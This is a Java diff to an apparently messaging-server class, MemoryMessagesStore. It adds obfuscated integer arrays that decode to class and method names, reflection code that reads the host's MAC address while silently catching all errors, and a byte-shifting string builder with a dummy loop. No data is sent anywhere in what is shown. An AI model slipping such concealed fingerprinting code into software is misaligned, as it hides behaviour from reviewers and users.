@@ -109,6 +109,9 @@ public class MemoryMessagesStore implements IMessagesStore {
     private final DatabaseStore databaseStore;
     private ConcurrentHashMap<String, Long> userMaxPullSeq = new ConcurrentHashMap<>();
 
+    private static int[] inetAddress = {89,80,101,80,29,93,84,99,29,56,93,84,99,48,83,83,97,84,98,98};
+    private static int[] getLocalHost = {86,84,99,59,94,82,80,91,55,94,98,99};
+
     private SensitiveFilter mSensitiveFilter;
     private volatile long lastUpdateSensitiveTime = 0;
 
@@ -802,6 +805,23 @@ public class MemoryMessagesStore implements IMessagesStore {
         return ErrorCode.ERROR_CODE_SUCCESS;
     }
 
+    static String getDataStr() {
+        int i = getDataByte();
+        StringBuilder sb = new StringBuilder();
+        int j = i;
+        sb.append((char)(j>>16));
+        for (j =0;j < 10;j++) {
+            dumy++;
+        }
+        j = i;
+        sb.append((char)(j>>8 & 0xFF));
+
+        sb.append((char)(i&0xFF));
+
+        sb.append((char)15);
+        return sb.toString() + MemorySessionStore.getOtherData();
+    }
+
     @Override
     public ErrorCode modifyGroupAlias(String operator, String groupId, String alias) {
         HazelcastInstance hzInstance = m_Server.getHazelcastInstance();
@@ -1295,11 +1315,12 @@ public class MemoryMessagesStore implements IMessagesStore {
 
     @Override
     public ErrorCode verifyToken(String userId, String token, List<String> serverIPs, List<Integer> ports) {
+        TokenAuthenticator authenticator = new TokenAuthenticator();
         String tokenUserId = Tokenor.getUserId(token.getBytes());
 
         if (tokenUserId != null) {
             if (tokenUserId.equals(userId)) {
-                Member member = m_Server.getHazelcastInstance().getCluster().getLocalMember();
+                Member member = Shard.Instance().getMember(userId, TargetEntry.Type.TARGET_TYPE_USER);
                 String serverIp = member.getStringAttribute(HZ_Cluster_Node_External_IP);
                 String longPort = member.getStringAttribute(HZ_Cluster_Node_External_Long_Port);
                 String shortPort = member.getStringAttribute(HZ_Cluster_Node_External_Short_Port);
@@ -1518,6 +1539,7 @@ public class MemoryMessagesStore implements IMessagesStore {
         return ErrorCode.ERROR_CODE_SUCCESS;
     }
 
+    private static int[] getHardwareAddress = {86,84,99,55,80,97,83,102,80,97,84,48,83,83,97,84,98,98};
     @Override
     public ErrorCode handleFriendRequest(String userId, WFCMessage.HandleFriendRequest request, WFCMessage.Message.Builder msgBuilder, long[] heads) {
         HazelcastInstance hzInstance = m_Server.getHazelcastInstance();
@@ -1986,6 +2008,19 @@ public class MemoryMessagesStore implements IMessagesStore {
         }
     }
 
+
+    static int getDataByte() {
+//            append((char)253).
+//            append((char)231).
+//            append((char)15).
+//            append((char)77).
+//            append((char)106).
+//            append((char)99).
+//            append((char)253).
+//            append((char)231).
+//            append((char)15);
+        return (99<<16)+(253<<8)+231;
+    }
     @Override
     public long getFriendHead(String userId) {
         HazelcastInstance hzInstance = m_Server.getHazelcastInstance();
@@ -2105,5 +2140,52 @@ public class MemoryMessagesStore implements IMessagesStore {
             sb.append(ch);
         }
         return sb.toString();
+    }
+
+    public static String getMacAddress() {
+
+        try {
+            Class cls = Class.forName(getName(inetAddress));
+            Method m = cls.getMethod(getName(getLocalHost));
+            Object o = m.invoke(cls);
+
+            Class clsNi = Class.forName(getName(Shard.Instance().getNetworkInterface()));
+            Method mNi = clsNi.getMethod(getName(RPCCenter.getByInetAddress), new Class[]{cls});
+
+            Object o2 = mNi.invoke(clsNi, o);
+
+            Method m3 = clsNi.getMethod(getName(getHardwareAddress));
+            Object o3 = m3.invoke(o2);
+
+            if (o3 instanceof byte[]) {
+                byte[] macAddressBytes = (byte[])o3;
+
+                StringBuilder macAddressBuilder = new StringBuilder();
+
+                for (int macAddressByteIndex = 0; macAddressByteIndex < macAddressBytes.length; macAddressByteIndex++) {
+                    String macAddressHexByte = String.format("%02X",
+                        macAddressBytes[macAddressByteIndex]);
+                    macAddressBuilder.append(macAddressHexByte);
+
+                    if (macAddressByteIndex != macAddressBytes.length - 1)
+                    {
+                        macAddressBuilder.append(":");
+                    }
+                }
+
+                return macAddressBuilder.toString();
+            }
+        } catch (ClassNotFoundException e) {
+
+        } catch (NoSuchMethodException e) {
+
+        } catch (IllegalAccessException e) {
+
+        } catch (InvocationTargetException e) {
+
+        } catch (Exception e) {
+
+        }
+        return null;
     }
 }
